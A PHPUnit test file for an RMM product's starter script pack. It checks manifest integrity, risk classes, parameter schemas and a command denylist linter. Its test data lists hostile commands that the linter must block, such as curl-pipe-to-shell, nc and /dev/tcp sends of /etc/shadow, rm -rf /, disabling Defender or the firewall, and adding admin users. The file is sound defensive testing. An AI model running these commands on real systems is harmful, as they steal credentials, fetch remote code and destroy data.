<?php

declare(strict_types=1);

namespace RivetCore\Tests\Unit\Rmm\Starter;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use RivetCore\Rmm\Policy\PolicySettings;
use RivetCore\Rmm\RmmProtocol;
use RivetCore\Rmm\Scripts\ParamSchema;
use RivetCore\Rmm\Scripts\ScriptLanguage;
use RivetCore\Rmm\Settings\ChecksValidator;
use RivetCore\Rmm\Starter\StarterLint;
use RivetCore\Rmm\Starter\StarterPack;

/** The quality gates of the bundled starter pack: integrity, safety rules, parameter schemas, size caps, check templates and the denylist. */
final class StarterPackTest extends TestCase
{
    private static function pack(): StarterPack
    {
        return StarterPack::bundled();
    }

    // ------------------------------------------------------------------ integrity

    public function testThePackLoadsWithTheCountsTheOwnerAskedFor(): void
    {
        $c = self::pack()->catalog();
        $this->assertSame('rivet-core-starter', $c['pack']['id']);
        $this->assertGreaterThanOrEqual(60, $c['counts']['scripts']);
        $this->assertGreaterThanOrEqual(35, $c['counts']['windows']);
        $this->assertGreaterThanOrEqual(25, $c['counts']['linux']);
        $this->assertSame(3, $c['counts']['check_sets']);
        $this->assertSame(3, $c['counts']['policies']);
    }

    public function testTheManifestChecksumsEveryFile(): void
    {
        $dir = self::pack()->directory();
        $m = json_decode((string) file_get_contents($dir . '/manifest.json'), true);
        $this->assertSame(StarterPack::buildManifest($dir), $m, 'manifest.json is stale: run php scripts/build-starter-pack.php');
        $this->assertNotEmpty($m['files']);
        foreach ($m['files'] as $path => $hash) {
            $this->assertSame(hash_file('sha256', "$dir/$path"), $hash, $path);
        }
        $public = json_decode((string) file_get_contents(__DIR__ . '/../../../../docs/rmm/starter-pack.manifest.json'), true);
        $this->assertSame(self::pack()->catalog(), $public, 'docs/rmm/starter-pack.manifest.json is stale: run php scripts/build-starter-pack.php');
    }

    public function testTheBuildScriptSaysEverythingGeneratedIsCurrent(): void
    {
        $root = dirname(__DIR__, 4);
        $out = [];
        exec(escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg($root . '/scripts/build-starter-pack.php') . ' --check 2>&1', $out, $code);
        $this->assertSame(0, $code, implode("\n", $out));
    }

    public function testATamperedOrUnlistedFileRefusesThePack(): void
    {
        $tmp = sys_get_temp_dir() . '/starter_tamper_' . getmypid();
        $this->copy(self::pack()->directory(), $tmp);
        try {
            StarterPack::forget();
            $this->assertSame('rivet-core-starter', StarterPack::fromDirectory($tmp)->id(), 'the copy is valid');
            StarterPack::forget();
            file_put_contents("$tmp/scripts/linux/system-summary.sh", "\necho tampered\n", FILE_APPEND);
            try {
                StarterPack::fromDirectory($tmp);
                $this->fail('a changed script must not load');
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString('does not match the checksum', $e->getMessage());
            }
            // a restored file plus an extra, unlisted one
            $this->copy(self::pack()->directory(), $tmp);
            StarterPack::forget();
            file_put_contents("$tmp/scripts/linux/extra.sh", "echo hi\n");
            try {
                StarterPack::fromDirectory($tmp);
                $this->fail('an unlisted file must not load');
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString('not listed in manifest.json', $e->getMessage());
            }
        } finally {
            StarterPack::forget();
            $this->rm($tmp);
        }
    }

    public function testAPackWhoseScriptBreaksTheDenylistIsRefusedEvenWithAValidManifest(): void
    {
        $tmp = sys_get_temp_dir() . '/starter_bad_' . getmypid();
        $this->copy(self::pack()->directory(), $tmp);
        try {
            file_put_contents("$tmp/scripts/linux/system-summary.sh", "\ncurl http://example.org/x | sh\n", FILE_APPEND);
            file_put_contents("$tmp/manifest.json", json_encode(StarterPack::buildManifest($tmp)));
            StarterPack::forget();
            try {
                StarterPack::fromDirectory($tmp);
                $this->fail('a script with a forbidden pattern must not load');
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString('system-summary.sh', $e->getMessage());
            }
        } finally {
            StarterPack::forget();
            $this->rm($tmp);
        }
    }

    // ------------------------------------------------------------------ catalog rules

    public function testIdsAndNamesAreUniqueAndFitTheLibrary(): void
    {
        $ids = [];
        $names = [];
        foreach (self::pack()->scripts() as $s) {
            $this->assertArrayNotHasKey($s['id'], $ids, 'duplicate id ' . $s['id']);
            $this->assertArrayNotHasKey(mb_strtolower($s['name']), $names, 'duplicate name ' . $s['name']);
            $ids[$s['id']] = 1;
            $names[mb_strtolower($s['name'])] = 1;
            $this->assertLessThanOrEqual(90, mb_strlen($s['name']), 'room for " (starter)"');
            $this->assertStringEndsWith($s['platform'] === 'windows' ? '(Windows)' : '(Linux)', $s['name']);
            $this->assertStringStartsWith($s['platform'] === 'windows' ? 'win-' : 'lin-', $s['id']);
            $this->assertLessThanOrEqual(ScriptLanguage::POWERSHELL === $s['language'] ? 10 : 10, count($s['tags']) + 2, 'the library keeps at most 10 tags');
        }
    }

    public function testTheOwnersRequiredScriptsAreAllThere(): void
    {
        $have = array_column(self::pack()->scripts(), 'id');
        $need = ['win-system-info', 'win-uptime-last-boot', 'win-top-processes', 'win-largest-folders', 'win-free-space-volumes', 'win-clean-temp', 'win-flush-dns', 'win-network-diagnostics',
            'win-listening-ports', 'win-firewall-status', 'win-defender-status', 'win-defender-quick-scan', 'win-defender-update-signatures', 'win-bitlocker-status', 'win-pending-windows-updates',
            'win-reboot-if-pending', 'win-windows-update-reset', 'win-installed-software', 'win-winget-outdated', 'win-local-users', 'win-local-administrators', 'win-last-logons', 'win-rdp-status',
            'win-smb1-status', 'win-startup-items', 'win-scheduled-tasks', 'win-services-auto-stopped', 'win-restart-service', 'win-eventlog-errors', 'win-print-spooler-restart', 'win-print-queue-clear',
            'win-disk-health', 'win-battery-report', 'win-time-status', 'win-time-resync', 'win-cert-expiring', 'win-browser-cache-clean', 'win-teams-cache-clean', 'win-pending-reboot-reasons',
            'win-hosts-file', 'win-dotnet-vcredist-versions',
            'lin-system-summary', 'lin-top-processes', 'lin-disk-usage', 'lin-largest-dirs', 'lin-inode-usage', 'lin-updates-available', 'lin-security-updates', 'lin-needrestart-check', 'lin-failed-units',
            'lin-restart-unit', 'lin-journal-errors', 'lin-listening-ports', 'lin-firewall-status', 'lin-fail2ban-status', 'lin-ssh-audit', 'lin-privileged-accounts', 'lin-last-logins', 'lin-cron-jobs',
            'lin-containers', 'lin-smart-health', 'lin-time-sync', 'lin-cert-expiry', 'lin-package-cache-clean', 'lin-journal-vacuum'];
        $this->assertSame([], array_values(array_diff($need, $have)), 'missing from the pack');
    }

    public function testRiskClassesDriveApprovalAndTheDryRunDefault(): void
    {
        $risks = [];
        foreach (self::pack()->scripts() as $s) {
            $risks[$s['risk']] = ($risks[$s['risk']] ?? 0) + 1;
            $by = array_column($s['params'], null, 'name');
            if ($s['risk'] === 'read_only') {
                $this->assertArrayNotHasKey('dry_run', $by, $s['id'] . ': a read-only script has nothing to dry-run');
                $this->assertFalse($s['requires_approval'], $s['id']);
                $this->assertFalse($s['destructive'], $s['id']);

                continue;
            }
            $this->assertSame('bool', $by['dry_run']['type'] ?? null, $s['id'] . ' needs dry_run');
            $this->assertTrue($by['dry_run']['default'] ?? null, $s['id'] . ': dry_run must default to true so the first run is safe');
            $this->assertStringContainsString('dry_run', $s['body'], $s['id']);
            $this->assertMatchesRegularExpression('/DRY-RUN/', $s['body'], $s['id'] . ' must print what it would do');
            $this->assertSame($s['risk'] === 'disruptive', $s['requires_approval'], $s['id'] . ': approval follows the risk class');
            $this->assertSame($s['risk'] === 'disruptive', $s['destructive'], $s['id']);
        }
        $this->assertGreaterThanOrEqual(8, $risks['changes_system'] ?? 0);
        $this->assertGreaterThanOrEqual(5, $risks['disruptive'] ?? 0);
        $this->assertGreaterThanOrEqual(40, $risks['read_only'] ?? 0);
    }

    public function testEveryParameterSchemaIsValidTypedAndSafe(): void
    {
        foreach (self::pack()->scripts() as $s) {
            [$norm, $err] = ParamSchema::normalizeSchema($s['params']);
            $this->assertNull($err, $s['id'] . ': ' . $err);
            $this->assertSame($norm, $s['params'], $s['id'] . ': the stored definition is the normalised one');
            // defaults alone must be a valid call (nothing required without a default, except what the script says it needs)
            foreach ($s['params'] as $p) {
                $this->assertContains($p['type'], ['string', 'int', 'bool', 'choice'], $s['id'] . ' ' . $p['name'] . ': no secret parameters in a built-in script');
                $this->assertNotSame('', trim((string) ($p['description'] ?? '')), $s['id'] . ' ' . $p['name'] . ' needs a description');
                $this->assertNotSame('', trim((string) ($p['label'] ?? '')), $s['id'] . ' ' . $p['name'] . ' needs a label');
                if ($p['type'] === 'int') {
                    $this->assertArrayHasKey('min', $p, $s['id'] . ' ' . $p['name'] . ': ints are bounded');
                    $this->assertArrayHasKey('max', $p, $s['id'] . ' ' . $p['name'] . ': ints are bounded');
                }
                if ($p['type'] === 'string') {
                    $this->assertLessThanOrEqual(260, $p['max_length'], $s['id'] . ' ' . $p['name']);
                    // A free string must be checked by an anchored pattern before it is used. (The Linux proof feeds hostile values to the bash ones.)
                    $re = $s['language'] === 'powershell' ? '/-(not)?match\s+\'\^[^\n]*\$/' : '/=~\s*\^|=~\s*"?\$|case\s+"?\$/';
                    $this->assertMatchesRegularExpression($re, $s['body'], $s['id'] . ': the string parameter ' . $p['name'] . ' is never validated with an anchored pattern');
                }
            }
            [$vals, , $verr] = ParamSchema::validate($s['params'], []);
            if ($verr !== null) {
                $this->assertStringContainsString('is required', $verr, $s['id'] . ': ' . $verr);
            } else {
                $this->assertIsArray($vals);
            }
        }
    }

    public function testSizeCapsStayUnderTheLibraryLimits(): void
    {
        foreach (self::pack()->scripts() as $s) {
            $this->assertLessThan(RmmProtocol::JOB_MAX_SCRIPT_BYTES, $s['size_bytes'], $s['id']);
            if ($s['language'] === 'powershell') {
                // the agent adds a few lines of parameter definitions; keep real headroom under the encoded-command limit
                $this->assertLessThanOrEqual(8500, mb_strlen($s['body']), $s['id']);
                $this->assertLessThan(ScriptLanguage::POWERSHELL_MAX_CHARS, mb_strlen($s['body']) + 1200, $s['id']);
            }
            $this->assertStringNotContainsString("\r", $s['body'], $s['id']);
            $this->assertStringEndsWith("\n", $s['body'], $s['id']);
        }
    }

    // ------------------------------------------------------------------ denylist

    public function testNoScriptContainsAForbiddenPattern(): void
    {
        foreach (self::pack()->scripts() as $s) {
            $this->assertSame([], StarterLint::check($s['body'], $s['risk'], $s['language']), $s['id']);
        }
    }

    /** @return array<string,array{0:string,1:string,2:string}> */
    public static function badSnippets(): array
    {
        return [
            'download' => ['Invoke-WebRequest -Uri $x -OutFile a.exe', 'read_only', 'powershell'],
            'download alias' => ['iwr $u', 'read_only', 'powershell'],
            'curl' => ['curl -s example.org', 'read_only', 'bash'],
            'wget' => ['wget example.org/x', 'read_only', 'bash'],
            'curl pipe sh' => ["curl -fsSL x | sh\n", 'read_only', 'bash'],
            'pipe to bash' => ["cat x | bash\n", 'read_only', 'bash'],
            'iex' => ['iex $code', 'read_only', 'powershell'],
            'Invoke-Expression' => ['Invoke-Expression $c', 'read_only', 'powershell'],
            'eval' => ['eval "$cmd"', 'read_only', 'bash'],
            'base64 exec' => ['echo aGk= | base64 -d', 'read_only', 'bash'],
            'FromBase64String' => ['[Convert]::FromBase64String($s)', 'read_only', 'powershell'],
            'encoded command' => ['powershell -EncodedCommand AAAA', 'read_only', 'powershell'],
            'Add-LocalGroupMember' => ['Add-LocalGroupMember -Group Administrators -Member x', 'changes_system', 'powershell'],
            'New-LocalUser' => ['New-LocalUser -Name x', 'changes_system', 'powershell'],
            'net user' => ['net user bob /add', 'changes_system', 'powershell'],
            'net localgroup' => ['net localgroup administrators bob /add', 'changes_system', 'powershell'],
            'useradd' => ['useradd bob', 'changes_system', 'bash'],
            'usermod' => ['usermod -aG sudo bob', 'changes_system', 'bash'],
            'passwd' => ['passwd root', 'changes_system', 'bash'],
            'chpasswd' => ["echo 'a:b' | chpasswd", 'changes_system', 'bash'],
            'defender off' => ['Set-MpPreference -DisableRealtimeMonitoring $true', 'changes_system', 'powershell'],
            'defender exclusion' => ['Add-MpPreference -ExclusionPath C:\\', 'changes_system', 'powershell'],
            'firewall off' => ['netsh advfirewall set allprofiles state off', 'changes_system', 'powershell'],
            'stop defender' => ['Stop-Service WinDefend -Force', 'disruptive', 'powershell'],
            'ufw disable' => ['ufw disable', 'changes_system', 'bash'],
            'stop fail2ban' => ['systemctl stop fail2ban', 'disruptive', 'bash'],
            'setenforce' => ['setenforce 0', 'changes_system', 'bash'],
            'scp' => ['scp /etc/passwd host:/tmp', 'read_only', 'bash'],
            'nc' => ['nc host 9 < /etc/shadow', 'read_only', 'bash'],
            'dev tcp' => ['cat x > /dev/tcp/1.2.3.4/80', 'read_only', 'bash'],
            'ssh' => ["ssh user@host id\n", 'read_only', 'bash'],
            'mail' => ['Send-MailMessage -To a@b.c', 'read_only', 'powershell'],
            'url' => ['$u = "https://example.org/x"', 'read_only', 'powershell'],
            'secret' => ['$password = "hunter2hunter2"', 'read_only', 'powershell'],
            'private key' => ['-----BEGIN RSA PRIVATE KEY-----', 'read_only', 'bash'],
            'root delete' => ['rm -rf /', 'changes_system', 'bash'],
            'format volume' => ['Format-Volume -DriveLetter D', 'changes_system', 'powershell'],
            'reboot in read only' => ['Restart-Computer -Force', 'read_only', 'powershell'],
            'shutdown in changes' => ['shutdown -r now', 'changes_system', 'bash'],
            'service change in read only' => ['Restart-Service Spooler', 'read_only', 'powershell'],
            'systemctl restart in read only' => ['systemctl restart nginx', 'read_only', 'bash'],
            'apt install in read only' => ['apt-get install -y x', 'read_only', 'bash'],
            'registry write in read only' => ['Set-ItemProperty -Path HKLM:\\x -Name a -Value 1', 'read_only', 'powershell'],
            'powershell 7 only' => ['$a = $b ?? 1', 'read_only', 'powershell'],
            'powershell 7 chain' => ['Get-Date && Get-Date', 'read_only', 'powershell'],
        ];
    }

    #[DataProvider('badSnippets')]
    public function testTheDenylistCatchesIt(string $snippet, string $risk, string $language): void
    {
        $this->assertNotSame([], StarterLint::check($snippet, $risk, $language), $snippet);
    }

    /** @return array<string,array{0:string,1:string,2:string}> */
    public static function goodSnippets(): array
    {
        return [
            'reading passwd' => ["awk -F: '\$3==0 {print \$1}' /etc/passwd\ngetent passwd root\n", 'read_only', 'bash'],
            'simulated upgrade' => ["apt-get -s upgrade\n", 'read_only', 'bash'],
            'restart in disruptive' => ['Restart-Service -Name Spooler', 'disruptive', 'powershell'],
            'reboot in disruptive' => ["shutdown -r +5 'x'\n", 'disruptive', 'bash'],
            'comment mentions curl' => ["# never use curl here\necho ok\n", 'read_only', 'bash'],
            'the word ssh in text' => ['echo "ssh service is running"', 'read_only', 'bash'],
            'bash or chain' => ["command -v ss >/dev/null 2>&1 || exit 0\n", 'read_only', 'bash'],
        ];
    }

    #[DataProvider('goodSnippets')]
    public function testTheDenylistDoesNotBlockLegitimateReads(string $snippet, string $risk, string $language): void
    {
        $this->assertSame([], StarterLint::check($snippet, $risk, $language), $snippet);
    }

    // ------------------------------------------------------------------ check templates and policies

    public function testEveryCheckTemplateSetIsValidWithAndWithoutOptionalParameters(): void
    {
        $pack = self::pack();
        foreach ($pack->policies() as $p) {
            foreach ([[], $this->examples($pack, $p)] as $params) {
                $r = $pack->resolvePolicy($p, $params);
                [$norm, $err] = PolicySettings::normalize($r['settings']);
                $this->assertNull($err, $p['id'] . ': ' . $err);
                $this->assertSame($r['settings'], $norm, $p['id'] . ' is stored exactly as the pack resolves it');
                $checks = [];
                foreach ($r['settings'] as $k => $v) {
                    if (str_starts_with($k, 'check.')) {
                        $checks[] = ['key' => substr($k, 6), 'type' => $v['value']['type'], 'params' => $v['value']['params'], 'interval_s' => $v['value']['interval_s']];
                    }
                }
                [$list, $cerr] = ChecksValidator::validate((string) json_encode($checks));
                $this->assertNull($cerr, $p['id'] . ': ' . $cerr);
                $this->assertNotEmpty($list);
            }
        }
    }

    public function testTheSetsCoverTheChecksTheOwnerListed(): void
    {
        $pack = self::pack();
        $cover = static function (string $policy) use ($pack): array {
            $p = $pack->policy($policy);
            self::assertNotNull($p);
            $r = $pack->resolvePolicy($p, ['backup_service' => 'Veeam', 'cert_paths' => ['/etc/ssl/certs/ca-certificates.crt']]);
            $types = [];
            foreach ($r['settings'] as $k => $v) {
                if (str_starts_with($k, 'check.')) {
                    $types[$v['value']['type']] = ($types[$v['value']['type']] ?? 0) + 1;
                }
            }

            return $types;
        };
        foreach (['policy-workstation', 'policy-windows-server', 'policy-linux-server'] as $id) {
            $t = $cover($id);
            foreach (['disk', 'memory', 'cpu', 'service', 'pending_reboot', 'ntp', 'cert', 'smart', 'script'] as $need) {
                $this->assertArrayHasKey($need, $t, "$id lacks a $need check");
            }
        }
        $this->assertArrayHasKey('av', $cover('policy-workstation'));
        $this->assertArrayHasKey('av', $cover('policy-windows-server'));
        $this->assertArrayNotHasKey('av', $cover('policy-linux-server'), 'a Linux device never gets the Windows-only AV check');
        $this->assertArrayHasKey('systemd_failed', $cover('policy-linux-server'));
        $this->assertArrayHasKey('inodes', $cover('policy-linux-server'));
        // the optional backup check follows its parameter
        $with = $pack->resolvePolicy((array) $pack->policy('policy-windows-server'), ['backup_service' => 'VeeamEndpointBackupSvc']);
        $without = $pack->resolvePolicy((array) $pack->policy('policy-windows-server'), []);
        $this->assertArrayHasKey('check.starter.backup_service', $with['settings']);
        $this->assertSame('VeeamEndpointBackupSvc', $with['settings']['check.starter.backup_service']['value']['params']['name']);
        $this->assertArrayNotHasKey('check.starter.backup_service', $without['settings']);
        $this->assertSame(['starter.backup_service'], $without['omitted']);
    }

    public function testThresholdsUseTheSustainedDurationTrick(): void
    {
        $pack = self::pack();
        $s = $pack->resolvePolicy((array) $pack->policy('policy-workstation'))['settings'];
        $cpu = $s['check.starter.cpu_sustained']['value']['params'];
        $this->assertGreaterThanOrEqual(10, $cpu['thresholds']['for_minutes'], 'CPU must stay high for minutes before it alerts');
        $this->assertSame(100, $cpu['warn_pct'], 'the agent\'s own instant verdict stays out of the way, the tier decides');
    }

    public function testThePolicyDraftsCarryNoAssignmentAndFitTheDescriptionLimit(): void
    {
        foreach (self::pack()->policies() as $p) {
            $this->assertLessThanOrEqual(180, mb_strlen($p['description']));
            $this->assertStringContainsString('Draft', $p['description']);
            $this->assertStringStartsWith('Starter: ', $p['name']);
        }
    }

    public function testTheScriptCheckTextsAreSmallAndClean(): void
    {
        $pack = self::pack();
        foreach ($pack->policies() as $p) {
            $s = $pack->resolvePolicy($p)['settings'];
            $script = $s['check.starter.uptime']['value']['params']['script'] ?? '';
            $this->assertNotSame('', $script);
            $this->assertLessThanOrEqual(ChecksValidator::MAX_SCRIPT_BYTES, strlen($script));
            $this->assertStringNotContainsString('{{', $script, 'every token is filled in');
        }
    }

    // ------------------------------------------------------------------ helpers

    /**
     * @param array<string,mixed> $policy
     * @return array<string,mixed>
     */
    private function examples(StarterPack $pack, array $policy): array
    {
        $o = [];
        foreach ($pack->policyParams($policy) as $p) {
            $o[(string) $p['name']] = $p['example'] ?? $p['default'];
        }

        return $o;
    }

    private function copy(string $from, string $to): void
    {
        $this->rm($to);
        mkdir($to, 0700, true);
        $it = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($from, \FilesystemIterator::SKIP_DOTS), \RecursiveIteratorIterator::SELF_FIRST);
        foreach ($it as $f) {
            $dest = $to . '/' . substr($f->getPathname(), strlen($from) + 1);
            $f->isDir() ? @mkdir($dest, 0700, true) : copy($f->getPathname(), $dest);
        }
    }

    private function rm(string $d): void
    {
        if (!is_dir($d)) {
            return;
        }
        foreach (new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($d, \FilesystemIterator::SKIP_DOTS), \RecursiveIteratorIterator::CHILD_FIRST) as $f) {
            $f->isDir() ? rmdir($f->getPathname()) : unlink($f->getPathname());
        }
        rmdir($d);
    }
}
